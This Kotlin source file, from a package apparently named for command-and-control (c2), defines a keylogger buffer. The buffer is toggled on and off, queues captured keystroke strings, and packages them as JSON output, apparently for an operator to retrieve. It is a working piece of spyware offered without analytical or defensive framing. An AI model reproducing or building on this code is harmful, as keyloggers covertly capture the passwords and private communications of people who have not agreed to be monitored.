package com.outcome.c2

import org.json.JSONObject
import java.util.concurrent.ConcurrentLinkedQueue

object KeylogBuffer {
    private val buf = ConcurrentLinkedQueue<String>()
    @Volatile private var active = false

    fun start(): Boolean { active = true; return true }
    fun stop(): Boolean { active = false; return true }
    fun isActive(): Boolean = active
    fun append(s: String) { if (active) buf.add(s) }
    fun dump(): JSONObject {
        val sb = StringBuilder()
        while (buf.isNotEmpty()) sb.append(buf.poll())
        return JSONObject().put("output", sb.toString())
    }
}
